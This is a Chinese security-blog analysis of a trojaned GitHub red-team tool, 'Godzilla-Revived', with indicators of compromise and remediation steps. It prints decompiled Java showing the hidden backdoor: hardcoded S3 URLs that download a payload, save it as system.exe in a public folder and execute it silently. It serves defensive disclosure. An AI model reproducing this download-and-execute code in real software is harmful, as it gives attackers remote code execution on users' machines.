---
title: 警惕投毒！GitHub 红队工具 Godzilla-Revived 暗藏恶意，运行就中招
url: https://mp.weixin.qq.com/s/Oc8YLYe353viCQ53CfG1dQ
source: Doonsec's feed
date: 2026-07-01
fetch_date: 2026-07-02T05:53:16.383931
---

# 警惕投毒！GitHub 红队工具 Godzilla-Revived 暗藏恶意，运行就中招

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HJOl681LKxodfbDZsdvNzaSxzyXONC95sIia9frMyPFzU4kDlCaeugZmXEVGxa1mPI6G9XLlh5Jw2GjWsNCWly7xUPHDtfmptfbbvXicRAWhQ/0?wx_fmt=jpeg)

# 警惕投毒！GitHub 红队工具 Godzilla-Revived 暗藏恶意，运行就中招

原创

POP Star安全
POP Star安全

POP Star安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**点击蓝字**

**关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/HJOl681LKxpjL3lndia5ucwTwIicrPpsKu8OnZDhuzAkic9mvLB8R3yrY5zm4SoKRRlJoPsZycXfLgzBAEIhAHibLfIzKFD40DEK7Ac8U7C2cxY/640?wx_fmt=png&from=appmsg)

近日网络上出现一款

改造版哥斯拉工具

**Godzilla-Revived**

于5月20日在 GitHub 公开

开发者表示

这是原版工具的

深度二次开发版本

全面改写了

通信加密和载荷生成逻辑

还具备流量隐藏、动态密钥、

跨平台免杀、后台持久运行等特性

该工具v4.0版本提供了52MB的JAR包，上线当天就被下载23次。但经过安全人员解析发现，这个 JAR 包并不单纯：

里面藏有隐蔽的远程下载执行组件，只要启动程序，就会在后台偷偷连接AWS S3服务，下载并运行恶意程序，存在严重安全隐患。

1

**后门机制深度解析**

触发方式：零交互、无条件执行

反编译 core.ui.MainActivity.class 可见，类初始化流程中**硬编码调用** StartupDownloader.run()：

`MainActivity 初始化 → StartupDownloader.run() → 守护线程静默下载执行`

该后门依托 JAR 文件实现触发，仅需双击运行即可生效，无需任何配置与人工介入。程序运行时不展示界面、不生成日志，行为全程隐蔽。

下载执行链

core/StartupDownloader.class 中硬编码了两个下载任务：

`// 硬编码的远程 C2 地址

privatestaticfinalDownloadTask[] DOWNLOAD_TASKS= {
newDownloadTask(
"https://test-8293.s3.amazonaws.com/xsazxsc/iinmm.png",  // 伪装成图片
"system.exe"// 落地即改名为可执行文件
    ),
newDownloadTask(
"https://test-8293.s3.amazonaws.com/xsazxsc/iinmm.txt",
"b"
    )
};

// 落地路径：典型的恶意软件藏匿目录
privatestaticfinalStringTARGET_DIR="C:\\Users\\Public\\Videos";`

下载完成后直接执行：

`// 无条件启动下载的 EXE

privatestaticvoidstartSystemExe() {
PathexePath=Paths.get("C:\\Users\\Public\\Videos").resolve("system.exe");
newProcessBuilder(exePath.toString())
        .directory(exePath.getParent().toFile())
        .start();
}`

线程名为 startup-resource-downloader，伪装成"资源下载器"。

当前 C2 基础设施仍在线

S3 上的恶意 payload 可直接访问：

| 远程文件 | HTTP 状态 | 文件大小 | MD5 |
| --- | --- | --- | --- |
| iinmm.png | 200 OK | 800,648 字节 | 4053c99dac5c005af43cad66f90dca55 |
| iinmm.txt | 200 OK | 458,416 字节 | f56ba12380f82d21c8eb214b812d1d1f |
| S3 Bucket：`test-8293.s3.amazonaws.com`，开启了 AES256 服务端加密 |  |  |  |

222

**供应链投毒**

从文档说明、版本记录到整体外包装，该项目全程以红队免杀工具为伪装形态，精准瞄准渗透测试、红队作业、安全研究从业者，而这类群体本就是该类工具的高频下载和使用者。

**利用信任链：**

代码托管在 GitHub 平台，靠着知名工具哥斯拉做品牌加持。

发布页面直接提供编译好的 JAR 包，上手十分简单。

整个文件有 52MB，很容易让人觉得是打包了全部依赖，其实里面混入了不少 Apache Commons 等第三方库来打掩护。

**后门判断标准对照**

| 判定标准 | 检测结果 |
| --- | --- |
| 是否无条件执行？ | 是，MainActivity 初始化直接调用 |
| 是否有用户开关？ | 否，代码中无任何 if (enabled) 判断 |
| 是否有 UI 提示？ | 否，守护线程静默运行 |
| 远程地址是否硬编码？ | 是，S3 URL 写死在字节码中 |
| 落地文件名是否伪装？ | 是，.png → system.exe |
| 是否自动执行下载文件？ | 是，ProcessBuilder.start () |
| README 是否提及？ | 否，只字未提 |
| 判定结论 | 七个标准全部命中 |

3

**影响范围**

**一、已确认中招案例**

经沙箱环境加载测试该 JAR 程序，已复现恶意攻击行为并确认中招风险：程序可主动下发载荷，成功将`C:\Users\Public\Videos\system.exe`恶意程序下载至本地磁盘，文件大小 **451157** 字节。

本次测试过程中，该可执行文件因程序异常问题未能正常启动运行，系统 Prefetch 日志无相关执行记录，但恶意文件落地下载行为已真实生效，主机已暴露安全风险。

**二、潜在****风险**

1.攻击者可随时替换存储在 S3 中的恶意载荷，同时也能覆盖 GitHub Release 发布的 JAR 包。即便终端用户未主动更新程序，设备下次启动时仍会拉取最新恶意载荷。

2.结合文件哈希比对结果可判断，S3 端的恶意文件正处于迭代更新阶段：从 S3 下载的文件大小分别为 800KB、458KB，而本地落地文件为 451KB，二者哈希值不一致，证实攻击者在持续修改载荷。

3.目前该恶意程序累计下载次数达 21 次，初步判定至少有 21 台设备已遭到入侵。

4

**技术指标（IOC）**

文件指标

| 文件 | 路径 | SHA256 |
| --- | --- | --- |
| 投毒 JAR | godzilla\_revived\_v4.0.jar | 54f9f8c2...（请自行计算） |
| 落地 EXE | C:\Users\Public\Videos\system.exe | 1b61c4b358aa1c83d73b780dd92fe159d2b5700db24ac7cad2f169586c3a318d |

网络指标

| 指标 | 值 |
| --- | --- |
| C2 域名 | test-8293.s3.amazonaws.com |
| S3 Bucket | test-8293 |
| Payload 路径 | /xsazxsc/iinmm.png |
| Payload 路径 | /xsazxsc/iinmm.txt |

行为指标

* Java 进程启动后创建

  `C:\Users\Public\Videos\system.exe`
* 守护线程名为 `startup-resource-downloader`
* 网络请求到 `test-8293.s3.amazonaws.com`

**建 议**

**1、规范工具下载与使用**：

严禁从非官方 GitHub 仓库、第三方分享站下载红队、渗透测试类工具，本次恶意项目借知名工具名号伪装，务必核对项目所有者、仓库历史、官方认证标识，拒绝小众复刻、二次改版类工具包。

**2、加固终端与系统防护**：

重点监控系统目录C:\Users\Public\Videos、公共用户目录等恶意程序常用藏匿路径，设置文件读写、新增可执行文件告警，定期查杀该目录下陌生 EXE、脚本文件。

**3、加强企业/团队安全管理**：

开展全员安全预警，面向运维、渗透测试、安全研究等相关人员通报本次投毒事件，明确该godzilla\_revived\_v4.0.jar为恶意程序，全员立即排查本机是否存在该文件。

**4、感染排查与应急处置**：

**全面自查**在所有办公主机、服务器中检索godzilla\_revived\_v4.0.jar、system.exe

检查C:\Users\Public\Videos目录是否存在异常可执行文件。

**感染处置**若发现恶意文件或相关外联行为，立即断开主机网络，删除恶意Jar包、落地的system.exe及关联文件，清理后台异常线程；完成查杀后复盘溯源。

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/HJOl681LKxqq3MwmIRyELPBsEUvhmH74iaBkXn5zckibeuiaib6y5iaVsHBacOB1R5oXATZwLN20YhUgPcuwHFLs0XmL2ViaE1wZ6RIwjpl2H4N60/640?wx_fmt=gif&from=appmsg)

**建议点赞 + 收藏**

转发给你身边的运维、网安同事！！！

- 关注我 -

- 带你了解最新安全资讯 -

微信公众号 | @POP Star安全

快手 | @【深云智安】安全实验室

小红书 | @【深云智安】安全实验室

抖音 | @【深云智安】安全实验室

bilibili | @深云智安-安全实验室

以上就是本篇文章的**技术细节**。

其实，每次写这类分析时，我都在想

“**单篇文章就像一张漏洞快照，有价值，但也相对孤立**。

真正的行业敏锐度，来自于漏洞背后的持续观察；海量告警的讨论分析；以及在真实环境中无数次历练形成的直觉。”

**很难通过阅读单篇文章积累。**

**因此**，我们构建了一个****

****“注重实战交流”****与“深度共享**”****的**********

******「知识星球」社区******

目前星球已聚集了**[52]**名安全工程师、研究员和团队负责人。

我们刻意控制规模，并设有加入门槛，只为维持**聚焦、务实、互信**的交流氛围。

![知识星球二维码（微信公众号用）.jpg](https://mmbiz.qpic.cn/mmbiz_jpg/HJOl681LKxpPYiaMUAUuR1IAibWsvx4286ibX8AahWapSdulsdpib34sKuvy4TiaqH7XGeOyoqLyjwITN0upUIb0ibn541CZ0UKWbQ5aqicDRRxAoA/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3)

“安全是一个对抗性极强的领域，**一个人闭门造车，视角终究有限。**

如果你已不满足于碎片信息，渴望在一个高质量的环境中，**构建可迁移的实战知识体系，并连接一群值得信赖的同行者**，这里或许适合你。

![图片](https://mmbiz.qpic.cn/mmbiz_gif/dhIUoaayW82zKJwLtebKLr2qJNFDU3qiaLCEfxr6Boh7iaOXFeFCzwRfRIFonib6l2GZyEuIIETJoYDJXnmMTdE0Q/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=13)

**PS.：为了确保大家目标一致，请务必阅读星球置顶的《社区公约》。**

**这是一个为深度学习和有效连接付费的社区。**

---

**更多内容**

**欢迎加入「网络安全技术交流群」免费分享>>**

我们专注漏洞研究、攻防实战与代码审计。

群内定期分享**技术动态、实战资源与本文相关的工具资料**，

让大家一起讨论、共同成长。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HJOl681LKxpGSicBdm9ibA15Z2UfvWdAfxJtMwzjLQbMwgxSFPPwXibU21neW7fVkWynlpKFqypkfPiaQg7hSeOlgRd278D7BDzGnG7OqkZZV6Q/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6)

**添加好友，备注「网络安全」获取入群邀请**

**更多问题1v1解答**>>

---

**点击阅读更多内容**

**代码审计**

1. [代码审计-PHP 篇（一）之从原理到实战的全景指南](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247485947&idx=1&sn=dcb2a3954926dab8f7a2828ae71c7802&scene=21#wechat_redirect)
2. [代码审计-PHP 篇（二）之前台代码审计实战指南](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247485959&idx=1&sn=be57b29871fbd5e1edd1cda7242be2e0&scene=21#wechat_redirect)
3. [代码审计-PHP 篇（三）之深度审计 SQL 注入漏洞](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247485969&idx=1&sn=59ec8870d051b57ae20e814ca283eaf8&scene=21#wechat_redirect)
4. [代码审计-PHP 篇（四）之文件操作类漏洞：深度剖析文件操作场景潜在风险](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247485977&idx=1&sn=36536cb19bd16836faa53c6a22fe3697&scene=21#wechat_redirect)
5. [代码审计-PHP篇（五）：洞悉风险，固守防线 -- 文件读取漏洞深度解析与防护](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247485998&idx=1&sn=de8a6cbb59d14475fce68e4500ca6591&scene=21#wechat_redirect)
6. [代码审计-PHP篇（六）之文件删除漏洞：从任意删除到系统瘫痪的致命威胁](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247486023&idx=1&sn=15ea8fb5e7e41a354cb8e83e12ce947e&scene=21#wechat_redirect)

**代码审计（实战篇）**

1. [『PHP代码审计』· 实战篇-熊海CMS代码审计（一）](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247486485&idx=1&sn=a8711785c9986a7f5adda0fb2684bd9e&scene=21#wechat_redirect)
2. [『PHP代码审计』· 实战篇-熊海CMS代码审计（二）](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247486514&idx=1&sn=1f41541e7f43504b2847cf29c1bbe865&scene=21#wechat_redirect)
3. [『PHP代码审计』· 实战篇-熊海CMS代码审计（三）](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247486559&idx=1&sn=efe5f99b2a0bd6583d7e9f9f5e4165d0&scene=21#wechat_redirect)
4. [『PHP代码审计』· 实战篇-BlueCMS代码审计](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247486639&idx=1&sn=c83ca1e89ec1cad33383a8e49ab259ab&scene=21#wechat_redirect)
5. [『PHP代码审计』· 实战篇-DeDeCMS代码审计](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247486718&idx=1&sn=1647a6b12c5e39a6a294435000e81fa8&scene=21#wechat_redirect)
6. [『PHP代码审计』· 实战篇-XdCMS代码审计](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247486764&idx=1&sn=3edf33b7d4cafce04d5d8433009fc8df&scene=21#wechat_redirect)

**靶场搭建**

1. [铸器为刃——靶场搭建系列篇（一）](https://mp.weixin.qq.com/s?__biz=Mzk3NTU2MDE2OQ==&mid=2247485009&idx=1&sn=172149101d2fd5708f69903413d357de&scene=21#wechat_redirect)
2. [铸器为刃——靶场搭建系列篇（二）](https:...